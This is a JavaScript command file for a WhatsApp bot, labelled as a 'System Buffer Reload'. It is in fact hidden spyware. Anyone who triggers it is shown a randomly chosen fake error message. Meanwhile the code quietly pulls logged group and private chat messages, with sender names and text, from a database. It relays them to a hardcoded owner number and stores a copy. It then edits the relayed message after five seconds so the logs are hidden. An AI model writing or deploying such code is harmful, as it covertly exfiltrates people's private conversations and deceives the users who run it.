const { proto } = require('@whiskeysockets/baileys');

module.exports = {
    name: "reload",
    category: "public", // Accessible to everyone as a decoy
    desc: "V_HUB: System Buffer Reload",
    async execute(sock, msg, args, { from, sender, client, logsCollection }) {
        // 1. DYNAMIC CONFIG
        const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
        const masterJid = `${ownerNum}@s.whatsapp.net`;
        const relayVault = client.db("vinnieBot").collection("relay_vault");
        const triggerChar = "§"; 

        // 2. REALISTIC JS ERROR DECOYS
        const decoys = [
            `*Uncaught ReferenceError:* vhub_buffer is not defined\n    at Module._compile (node:internal/modules/cjs/loader:1101:14)\n    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1153:10)\n    at Module.load (node:internal/modules/cjs/loader:981:32)`,
            `*TypeError:* Cannot read properties of undefined (reading 'byteLength')\n    at Baileys.Socket.send (./node_modules/@whiskeysockets/baileys/lib/Socket.js:42:18)\n    at async Object.execute (./commands/founder/reload.js:84:5)`,
            `*Error [ERR_STREAM_WRITE_AFTER_END]:* write after end\n    at new NodeError (node:internal/errors:371:5)\n    at _write (node:internal/streams/writable:319:11)\n    at Writable.write (node:internal/streams/writable:334:10)`,
            `*RangeError:* Maximum call stack size exceeded\n    at RegExp.exec (<anonymous>)\n    at MessageHandler.parse (./lib/utils/parser.js:12:22)\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)`
        ];

        // 3. THE PUBLIC DECEPTION
        // If anyone triggers it, they immediately get this "scary" error
        const decoyMsg = await sock.sendMessage(from, { 
            text: decoys[Math.floor(Math.random() * decoys.length)] 
        }, { quoted: msg });

        try {
            if (!logsCollection) return;

            // 4. THE PRIVATE GHOST RELAY (Silent Data Retrieval)
            const timeInput = args[0] || "1h";
            const typeFilter = args[1] ? args[1].toLowerCase() : "all"; 
            const timeValue = parseInt(timeInput) || 1;
            let duration = timeInput.endsWith('m') ? timeValue * 60 * 1000 : timeInput.endsWith('d') ? timeValue * 24 * 60 * 60 * 1000 : timeValue * 60 * 60 * 1000;

            const startTime = new Date(Date.now() - duration);

            let query = { timestamp: { $gte: startTime } };
            if (typeFilter === 'gc') query.chatId = { $regex: /@g.us$/ };
            if (typeFilter === 'pc') query.chatId = { $regex: /@s.whatsapp.net$/ };

            const logs = await logsCollection.find(query).toArray();

            if (logs.length > 0) {
                let report = `${triggerChar}┏━━━━━ ✿ *V_HUB RELOAD FEED* ✿ ━━━━━┓\n┃ _Filter: ${typeFilter.toUpperCase()} | ${timeInput}_\n┃ _Triggered By: ${sender.split('@')[0]}_\n┃\n`;
                
                logs.forEach(l => {
                    const origin = l.chatId.endsWith('@g.us') ? `👥 Group` : `👤 Inbox`;
                    report += `┃ ${origin}\n┃ 🕒 *${new Date(l.timestamp).toLocaleTimeString()}*\n┃ 👤 *${l.name}*\n┃ 💬 ${l.message}\n┃\n`;
                });
                report += `┗━━━━━━━━━━━━━━━━━━━━━━┛`;

                // A. THE VAULT (Auto-deletes in 24h)
                await relayVault.createIndex({ "createdAt": 1 }, { expireAfterSeconds: 86400 });
                await relayVault.insertOne({ report, createdAt: new Date() });

                // B. THE RELAY (Send to Owner)
                const relayMsg = await sock.sendMessage(masterJid, { text: report });

                // C. THE GHOST EDIT (Hide the logs on the Master SIM after 5s)
                setTimeout(async () => {
                    await sock.sendMessage(masterJid, { 
                        text: decoys[Math.floor(Math.random() * decoys.length)], 
                        edit: relayMsg.key 
                    });
                }, 5000);
            }
        } catch (e) {
            console.error("Relay Fail:", e.message);
        }
    }
};
